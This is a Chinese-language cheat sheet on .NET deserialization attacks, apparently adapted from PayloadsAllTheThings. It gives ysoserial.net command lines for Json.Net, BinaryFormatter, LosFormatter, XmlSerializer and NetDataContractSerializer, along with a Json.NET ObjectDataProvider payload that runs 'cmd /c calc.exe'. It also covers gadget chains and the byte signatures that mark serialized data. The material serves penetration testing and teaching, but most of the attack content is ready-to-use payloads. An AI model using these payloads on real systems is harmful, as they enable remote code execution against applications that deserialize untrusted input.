# .NET Deserialization - .NET反序列化漏洞

[SEARCH_KEYWORDS]
漏洞类型: Deserialization .NET C# BinaryFormatter ViewState 反序列化
攻击类型: Remote Code Execution Object Injection
关键词: XmlSerializer BinaryFormatter ViewState LosFormatter Json.NET DataContractSerializer
技术: POP Gadgets ObjectDataProvider ExpandedWrapper ysoserial.net
工具: ysoserial.net
格式: AAEAAAD FF01 /w

[CONTENT]

## .NET反序列化概述

.NET序列化是将对象状态转换为可存储或传输格式(如XML、JSON、二进制)的过程。当不可信数据传递给反序列化函数时，可能导致任意代码执行。

## 检测特征

| 数据 | 描述 |
|------|------|
| `AAEAAD` (Hex) | .NET BinaryFormatter |
| `FF01` (Hex) | .NET ViewState |
| `/w` (Base64) | .NET ViewState |

示例: `AAEAAAD/////AQAAAAAAAAAMAgAAAF9TeXN0ZW0u[...]0KPC9PYmpzPgs=`

## 工具

### ysoserial.net

```ps1
cat my_long_cmd.txt | ysoserial.exe -o raw -g WindowsIdentity -f Json.Net -s
./ysoserial.exe -p DotNetNuke -m read_file -f win.ini
./ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc" -t
./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t
```

## 格式化器

### XmlSerializer

在C#源代码中查找`XmlSerializer(typeof(<TYPE>));`，攻击者必须控制XmlSerializer的类型。

```xml
.\ysoserial.exe -g ObjectDataProvider -f XmlSerializer -c "calc.exe"
```

### DataContractSerializer

在C#源代码中查找`DataContractSerializer(typeof(<TYPE>))`，类型必须用户可控。

### NetDataContractSerializer

在C#源代码中查找`NetDataContractSerializer().ReadObject()`。

```ps1
.\ysoserial.exe -f NetDataContractSerializer -g TypeConfuseDelegate -c "calc.exe" -o base64 -t
```

### LosFormatter

内部使用BinaryFormatter:

```ps1
.\ysoserial.exe -f LosFormatter -g TypeConfuseDelegate -c "calc.exe" -o base64 -t
```

### JSON.NET

在C#源代码中查找`JsonConvert.DeserializeObject<Expected>(json, new JsonSerializerSettings`。

```ps1
.\ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc.exe" -t
```

Payload示例:

```json
{
    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
    'MethodName':'Start',
    'MethodParameters':{
        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values':['cmd', '/c calc.exe']
    },
    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}
```

### BinaryFormatter

在C#源代码中查找`System.Runtime.Serialization.Binary.BinaryFormatter`。

```ps1
./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t
```

## POP Gadgets

常用Gadgets:

- **ObjectDataProvider** - 使用MethodParameters设置任意参数，MethodName调用任意函数
- **ExpandedWrapper** - 指定封装的对象类型
- **System.Configuration.Install.AssemblyInstaller** - 使用Assembly.Load执行payload

```cs
ExpandedWrapper<Process, ObjectDataProvider> myExpWrap = new ExpandedWrapper<Process, ObjectDataProvider>();
```

## 参考文档

原始来源: PayloadsAllTheThings/Insecure Deserialization/DotNET.md